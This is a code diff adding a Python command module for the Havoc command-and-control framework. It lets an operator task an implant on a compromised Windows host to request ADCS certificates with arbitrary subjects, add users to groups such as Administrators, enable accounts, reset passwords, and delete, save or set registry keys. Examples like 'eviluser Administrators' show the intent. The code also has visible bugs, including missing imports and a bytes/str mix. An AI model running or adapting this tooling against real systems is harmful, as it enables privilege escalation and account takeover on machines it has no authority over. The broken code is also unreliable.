@@ -1,0 +1,501 @@
+from havoc import Demon, RegisterCommand, RegisterModule
+import re
+
+class MyPacker:
+    def __init__(self):
+        self.buffer : bytes = b''
+        self.size   : int   = 0
+
+    def getbuffer(self):
+        return pack("<L", self.size) + self.buffer
+
+    def addstr(self, s):
+        if s is None:
+            s = ''
+        if isinstance(s, str):
+            s = s.encode("utf-8" )
+        fmt = "<L{}s".format(len(s) + 1)
+        self.buffer += pack(fmt, len(s)+1, s)
+        self.size += calcsize(fmt)
+
+    def addWstr(self, s):
+        s = s.encode("utf-16_le")
+        fmt = "<L{}s".format(len(s) + 2)
+        self.buffer += pack(fmt, len(s)+2, s)
+        self.size += calcsize(fmt)
+
+    def addbytes(self, b):
+        fmt = "<L{}s".format(len(b))
+        self.buffer += pack(fmt, len(b), b)
+        self.size += calcsize(fmt)
+
+    def addbool(self, b):
+        fmt = '<I'
+        self.buffer += pack(fmt, 1 if b else 0)
+        self.size += calcsize(fmt)
+
+    def adduint32(self, n):
+        fmt = '<I'
+        self.buffer += pack(fmt, n)
+        self.size += calcsize(fmt)
+
+    def addshort(self, n):
+        fmt = '<h'
+        self.buffer += pack(fmt, n)
+        self.size += calcsize(fmt)
+
+def adcs_request( demonID, *params ):
+    TaskID : str    = None
+    demon  : Demon  = None
+    packer = MyPacker()
+    demon  = Demon( demonID )
+
+    num_params = len(params)
+    adcs_request_ca = ''
+    adcs_request_template = ''
+    adcs_request_subject = ''
+    adcs_request_altname = ''
+    adcs_request_install = 0
+    adcs_request_machine = 0
+
+    if num_params < 1:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
+        return True
+
+    if num_params > 6:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
+        return True
+
+    if not params[ 0 ].startswith('/CA:'):
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid first parameter" )
+        return True
+
+    adcs_request_ca = params[ 0 ][len('/CA:'):]
+
+    adcs_request_template = [param[len('/TEMPLATE:'):] for param in params if param.startswith('/TEMPLATE:')]
+    if adcs_request_template:
+        adcs_request_template = adcs_request_template[0]
+    else:
+        adcs_request_template = ''
+
+    adcs_request_subject = [param[len('/SUBJECT:'):] for param in params if param.startswith('/SUBJECT:')]
+    if adcs_request_subject:
+        adcs_request_subject = adcs_request_subject[0]
+    else:
+        adcs_request_subject = ''
+
+    adcs_request_altname = [param[len('/ALTNAME:'):] for param in params if param.startswith('/ALTNAME:')]
+    if adcs_request_altname:
+        adcs_request_altname = adcs_request_altname[0]
+    else:
+        adcs_request_altname = ''
+
+    adcs_request_install = 1 if '/INSTALL' in params else 0
+    adcs_request_machine = 1 if '/MACHINE' in params else 0
+
+    packer.addWstr(adcs_request_ca)
+    packer.addWstr(adcs_request_template)
+    packer.addWstr(adcs_request_subject)
+    packer.addWstr(adcs_request_altname)
+    packer.addshort(adcs_request_install)
+    packer.addshort(adcs_request_machine)
+
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to request an enrollment certificate" )
+
+    demon.InlineExecute( TaskID, "go", "bin/adcs_request.x64.o", packer.getbuffer(), False )
+
+    return TaskID
+
+def addusertogroup( demonID, *params ):
+    TaskID : str    = None
+    demon  : Demon  = None
+    packer = MyPacker()
+    demon  = Demon( demonID )
+
+    num_params = len(params)
+    username   = ''
+    groupname  = ''
+    server     = ''
+    domain     = ''
+
+    if num_params < 4:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
+        return True
+
+    if num_params > 4:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
+        return True
+
+    username  = params[ 0 ]
+    groupname = params[ 1 ]
+    server    = params[ 2 ]
+    domain    = params[ 3 ]
+
+    if server == '""':
+        server = ''
+    if domain == '""':
+        domain = ''
+
+    packer.addWstr(domain)
+    packer.addWstr(server)
+    packer.addWstr(username)
+    packer.addWstr(groupname)
+
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to add the user {username} to the {groupname} group" )
+
+    demon.InlineExecute( TaskID, "go", "bin/addusertogroup.x64.o", packer.getbuffer(), False )
+
+    return TaskID
+
+def enableuser( demonID, *params ):
+    TaskID : str    = None
+    demon  : Demon  = None
+    packer = MyPacker()
+    demon  = Demon( demonID )
+
+    num_params = len(params)
+    username   = ''
+    hostname     = ''
+
+    if num_params < 2:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
+        return True
+
+    if num_params > 2:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
+        return True
+
+    username  = params[ 0 ]
+    hostname    = params[ 1 ]
+
+    if hostname == '""':
+        hostname = ''
+
+    packer.addWstr(hostname)
+    packer.addWstr(username)
+
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to enable the user {username}" )
+
+    demon.InlineExecute( TaskID, "go", "bin/enableuser.x64.o", packer.getbuffer(), False )
+
+    return TaskID
+
+def setuserpass( demonID, *params ):
+    TaskID : str    = None
+    demon  : Demon  = None
+    packer = MyPacker()
+    demon  = Demon( demonID )
+
+    num_params = len(params)
+    username   = ''
+    password   = ''
+    computer   = ''
+
+    if num_params < 3:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
+        return True
+
+    if num_params > 3:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
+        return True
+
+    username  = params[ 0 ]
+    password  = params[ 1 ]
+    computer  = params[ 2 ]
+
+    if computer == '""':
+        computer = ''
+
+    packer.addWstr(computer)
+    packer.addWstr(username)
+    packer.addWstr(password)
+
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to change the password of the user {username} to {password}" )
+
+    demon.InlineExecute( TaskID, "go", "bin/setuserpass.x64.o", packer.getbuffer(), False )
+
+    return TaskID
+
+def reg_delete( demonID, *params ):
+    TaskID : str    = None
+    demon  : Demon  = None
+    packer = MyPacker()
+    demon  = Demon( demonID )
+
+    reghives = {
+        'HKCR': 0,
+        'HKCU': 1,
+        'HKLM': 2,
+        'HKU' : 3
+    }
+
+    num_params    = len(params)
+    params_parsed = 0
+    hostname      = ''
+    hive          = ''
+    path          = ''
+    key           = ''
+    delkey        = 0
+
+    if num_params < 3:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
+        return True
+
+    if num_params > 3:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
+        return True
+
+    if params[ params_parsed ].upper() not in reghives:
+        hostname = params[ params_parsed ]
+        params_parsed += 1
+
+    if params[ params_parsed ].upper() not in reghives:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid Hive value" )
+        return True
+
+    hive = reghives[ params[ params_parsed ].upper() ]
+    params_parsed += 1
+
+    path = params[ params_parsed ]
+    params_parsed += 1
+
+    if num_params > params_parsed:
+        key = params[ params_parsed ]
+        params_parsed += 1
+        delkey = 1
+    else:
+        delkey = 0
+
+    packer.addstr(hostname)
+    packer.adduint32(hive)
+    packer.addstr(path)
+    packer.addstr(key)
+    packer.adduint32(delkey)
+
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to delete a registry entry" )
+
+    demon.InlineExecute( TaskID, "go", "bin/reg_delete.x64.o", packer.getbuffer(), False )
+
+    return TaskID
+
+def reg_save( demonID, *params ):
+    TaskID : str    = None
+    demon  : Demon  = None
+    packer = MyPacker()
+    demon  = Demon( demonID )
+
+    reghives = {
+        'HKCR': 0,
+        'HKCU': 1,
+        'HKLM': 2,
+        'HKU' : 3
+    }
+
+    num_params = len(params)
+    hive       = ''
+    regpath    = ''
+    filepath   = ''
+
+    if num_params < 3:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
+        return True
+
+    if num_params > 3:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
+        return True
+
+    if params[ 0 ].upper() not in reghives:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid Hive" )
+        return True
+
+    hive     = reghives[ params[ 0 ].upper() ]
+    regpath  = params[ 1 ]
+    filepath = params[ 2 ]
+
+    packer.addstr(regpath)
+    packer.addstr(filepath)
+    packer.adduint32(hive)
+
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to save a registry entry" )
+
+    demon.InlineExecute( TaskID, "go", "bin/reg_save.x64.o", packer.getbuffer(), False )
+
+    return TaskID
+
+def reg_set( demonID, *params ):
+    TaskID : str    = None
+    demon  : Demon  = None
+    packer = MyPacker()
+    demon  = Demon( demonID )
+
+    regtypes = {
+        'REG_SZ':  1,
+        'REG_EXPAND_SZ':  2,
+        'REG_BINARY':  3,
+        'REG_DWORD':  4,
+        'REG_MULTI_SZ':  7,
+        'REG_QWORD':  11
+    }
+
+    reghives = {
+        'HKCR': 0,
+        'HKCU': 1,
+        'HKLM': 2,
+        'HKU' : 3
+    }
+
+    inttypes = {
+        'REG_DWORD': 1,
+        'REG_QWORD': 1
+    }
+
+    # parse parameters that contain quotes
+    params = ' '.join(params)
+    params = re.findall(r'".+?"|[^ ]+', params)
+    params = [param.strip('"') for param in params]
+
+    params_parsed = 0
+    num_params    = len(params)
+    hostname      = ''
+    hive          = ''
+    regpath       = ''
+    filepath      = ''
+    regstr        = ''
+
+    if num_params < 5:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
+        return True
+
+    if num_params > 6:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
+        return True
+
+    if params[ params_parsed ].upper() not in reghives:
+        hostname = f"\\\\{params[ params_parsed ]}"
+        params_parsed += 1
+
+    if params[ params_parsed ].upper() not in reghives:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid hive" )
+        return True
+
+    hive     = reghives[ params[ params_parsed ].upper() ]
+    params_parsed += 1
+
+    path     = params[ params_parsed ]
+    params_parsed += 1
+
+    key      = params[ params_parsed ]
+    params_parsed += 1
+
+    if params[ params_parsed ].upper() not in regtypes:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid type" )
+        return True
+
+    regstr = params[ params_parsed ].upper()
+    params_parsed += 1
+    _type = regtypes[ regstr ]
+
+    packer.addstr(hostname)
+    packer.adduint32(hive)
+    packer.addstr(path)
+    packer.addstr(key)
+    packer.adduint32(_type)
+
+    if regstr in inttypes:
+        try:
+            data = int( params[ params_parsed ] )
+            params_parsed += 1
+            assert data <= 0xffffffff
+        except Exception as e:
+            demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid data" )
+            return True
+        packer.adduint32(data)
+    elif regstr == 'REG_MULTI_SZ':
+        data = params[ params_parsed ]
+        params_parsed += 1
+        words = data.split(' ')
+        data = b''
+        for word in words:
+            data += word.encode('utf-8') + '\x00'
+        packer.addbytes(data)
+    elif regstr in ['REG_EXPAND_SZ', 'REG_SZ']:
+        data = params[ params_parsed ]
+        params_parsed += 1
+        packer.addstr(data)
+    elif regstr == 'REG_BINARY':
+        # TODO: implement openf, readb and closef
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "REG_BINARY is not supported" )
+        return True
+
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to save a registry entry" )
+
+    demon.InlineExecute( TaskID, "go", "bin/reg_set.x64.o", packer.getbuffer(), False )
+
+    return TaskID
+
+RegisterCommand( adcs_request, "", "adcs_request", "Request an enrollment certificate", 0, "/CA:ca [/TEMPLATE:template] [/SUBJECT:subject] [/ALTNAME:altname] [/INSTALL] [/MACHINE]", "1337 c:\\windwos\\temp\\test.txt" )
+RegisterCommand( addusertogroup, "", "addusertogroup", "Request an enrollment certificate", 0, """<USERNAME> <GROUPNAME> <Server> <DOMAIN>
+         USERNAME   Required. The user name to activate/enable. 
+         GROUPNAME  Required. The group to add the user to.
+         Server     Required. The target computer to perform the addition on. use \"\" for the local machine
+         DOMAIN     Required. The domain/computer for the account. You must give 
+                    the domain name for the user if it is a domain account, or
+                    use \"\" to target an account on the local machine.""", "eviluser Administrators \"\" \"\"" )
+RegisterCommand( enableuser, "", "enableuser", "Activates (and if necessary enables) the specified user account on the target computer.", 0, """<USERNAME> <HOSTNAME>
+         USERNAME  Required. The user name to activate/enable. 
+         HOSTNAME  Required. The domain/computer for the account. You must give 
+                   the domain name for the user if it is a domain account, or
+                   use \"\" to target an account on the local machine.""", "disabled_user \"\"" )
+RegisterCommand( setuserpass, "", "setuserpass", "Sets the password for the specified user account on the target computer.", 0, """<USERNAME> <PASSWORD> <COMPUTER>
+         USERNAME  Required. The user name to activate/enable. 
+         PASSWORD  Required. The new password. The password must meet GPO 
+                   requirements.
+         COMPUTER  Required. The domain/computer for the account. You must give 
+                   the domain name for the user if it is a domain account, or
+                   use \"\" to target an account on the local machine.""", "pwnedUser Password123! computer132 \"\"" )
+RegisterCommand( reg_delete, "", "reg_delete", "Deletes the registry key or value", 0, """<OPT:HOSTNAME> <HIVE> <REGPATH> <OPT:REGVALUE>
+         HOSTNAME Optional. The host to connect to and run the commnad on.
+         HIVE     Required. The registry hive containing the REGPATH. Possible 
+                  values:
+                    HKLM
+                    HKCU
+                    HKU
+                    HKCR
+         REGPATH  Required. The registry path (deleted if value not given).
+         REGVALUE Optional. The registry value to delete. If the value is not 
+                  specified, then the whole key is deleted. If you want to 
+                  delete the default key, use \"\" as the REGVALUE.""", "HKLM Some\\Path SomeKey" )
+RegisterCommand( reg_save, "", "reg_save", "Saves the registry path and all subkeys to disk", 0, """<HIVE> <REGPATH> <FILEOUT>
+         HIVE     Required. The registry hive containing the REGPATH. Possible 
+                  values:
+                    HKLM
+                    HKCU
+                    HKU
+                    HKCR
+         REGPATH  Required. The registry path to save.
+         FILEOUT  Required. The output file. 
+Note:    The FILEOUT is saved to disk on target, so don't forget to clean up.""", "HKLM Some\\Path c:\\windows\\temp\\reg.txt" )
+RegisterCommand( reg_set, "", "reg_set", "This command creates or sets the specified registry key (or value) on the target host.", 0, """<OPT:HOSTNAME> <HIVE> <REGPATH> <KEY> <TYPE> <DATA>
+         HOSTNAME Optional. The host to connect to and run the commnad on.
+         HIVE     Required. The registry hive containing the REGPATH. Possible 
+                  values:
+                    HKLM
+                    HKCU
+                    HKU
+                    HKCR
+         REGPATH  Required. The registry path to save.
+         KEY      Required. The registry path. 
+         TYPE     Required. The type of registry value to create/set. The valid
+                  options are:
+                    REG_SZ
+                    REG_EXPAND_SZ
+                    REG_BINARY
+                    REG_DWORD
+                    REG_MULTI_SZ
+                    REG_QWORD
+         DATA     Required. The data to store in the registry value.
+Note: For REG_BINARY, the VALUE must be the name of a file on disk which will 
+      read in and its contents used.
+Note: For REG_MULTI_SZ, the VALUE must be specified as a space separated list 
+      of quoted strings.
+Note: For REG_QWORD, the VALUE must be less than a DWORD """, "" )
